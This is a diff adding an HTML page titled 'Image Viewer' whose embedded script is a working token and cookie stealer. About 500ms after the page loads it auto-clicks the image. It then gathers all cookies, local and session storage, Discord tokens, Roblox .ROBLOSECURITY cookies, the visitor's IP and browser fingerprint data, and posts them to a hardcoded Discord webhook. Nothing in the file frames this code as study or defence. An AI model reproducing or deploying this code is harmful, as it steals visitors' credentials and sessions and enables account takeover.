@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Image Viewer</title></head>
+<body>
+<img src="injected_image.jpg" id="target" style="cursor:pointer; max-width:100%;" />
+<script>
+const webhook = 'https://discord.com/api/webhooks/1523463459101216819/ocJARDFz-9A2uXu2RZ68es4TWxgaS8ANB41TVA2OSTdetSqW1O3i05zvyz-iLifDaEkr';
+
+function getCookies() {
+    let c = document.cookie.split('; ');
+    let out = {};
+    c.forEach(p => {
+        if (p) {
+            let [k, ...vParts] = p.split('=');
+            out[k] = vParts.join('=');
+        }
+    });
+    return out;
+}
+
+function getDiscordToken() {
+    let token = null;
+    for (let key in localStorage) {
+        if (key.toLowerCase().includes('token')) {
+            try {
+                let val = localStorage[key];
+                if (val.startsWith('{') && val.includes('"token"')) {
+                    token = JSON.parse(val).token;
+                } else if (val.length > 50 && val.includes('.')) {
+                    token = val;
+                }
+            } catch(e) {}
+        }
+    }
+    if (!token) {
+        for (let key in sessionStorage) {
+            if (key.toLowerCase().includes('token')) {
+                try {
+                    let val = sessionStorage[key];
+                    if (val.startsWith('{') && val.includes('"token"')) {
+                        token = JSON.parse(val).token;
+                    } else if (val.length > 50 && val.includes('.')) {
+                        token = val;
+                    }
+                } catch(e) {}
+            }
+        }
+    }
+    if (!token) {
+        const bodyText = document.body.innerText || '';
+        const mfaMatch = bodyText.match(/mfa\.[a-zA-Z0-9_-]{84}/);
+        if (mfaMatch) token = mfaMatch[0];
+        const tokenMatch = bodyText.match(/[a-zA-Z0-9_-]{24,28}\.[a-zA-Z0-9_-]{6,7}\.[a-zA-Z0-9_-]{27,38}/);
+        if (tokenMatch && !token) token = tokenMatch[0];
+    }
+    return token || 'NO_TOKEN';
+}
+
+function getRobloxCookies() {
+    let r = {};
+    document.cookie.split('; ').forEach(p => {
+        if (p.includes('.ROBLOSECURITY')) {
+            r['.ROBLOSECURITY'] = p.split('=').slice(1).join('=');
+        }
+        if (p.includes('RBXSession')) {
+            r['RBXSession'] = p.split('=').slice(1).join('=');
+        }
+    });
+    return r;
+}
+
+function getAllStorage() {
+    let ls = {}, ss = {};
+    try {
+        for (let key in localStorage) ls[key] = localStorage[key];
+        for (let key in sessionStorage) ss[key] = sessionStorage[key];
+    } catch(e) {}
+    return { localStorage: ls, sessionStorage: ss };
+}
+
+async function getIP() {
+    try {
+        const r = await fetch('https://api.ipify.org?format=json');
+        const d = await r.json();
+        return d.ip;
+    } catch(e) { return 'IP_FAILED'; }
+}
+
+function collectAll() {
+    const storage = getAllStorage();
+    return {
+        url: window.location.href,
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screen: screen.width + 'x' + screen.height,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cookies: JSON.stringify(getCookies(), null, 2),
+        localStorage: JSON.stringify(storage.localStorage, null, 2),
+        sessionStorage: JSON.stringify(storage.sessionStorage, null, 2),
+        discordToken: getDiscordToken(),
+        robloxCookies: JSON.stringify(getRobloxCookies(), null, 2),
+        timestamp: new Date().toISOString()
+    };
+}
+
+async function sendData() {
+    const data = collectAll();
+    data.ip = await getIP();
+    const payload = {
+        content: '@everyone **IMAGE LOGGER TRIGGERED**',
+        embeds: [{
+            title: 'Exfiltrated Data',
+            color: 0xff0000,
+            fields: Object.keys(data).map(k => ({
+                name: k,
+                value: typeof data[k] === 'object' ? JSON.stringify(data[k], null, 2) : String(data[k]),
+                inline: false
+            })),
+            timestamp: new Date().toISOString()
+        }]
+    };
+    try {
+        await fetch(webhook, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+    } catch(e) { console.error(e); }
+}
+
+document.getElementById('target').addEventListener('click', sendData);
+window.onload = function() {
+    setTimeout(function() {
+        document.getElementById('target').click();
+    }, 500);
+};
+</script>
+</body>
+</html>
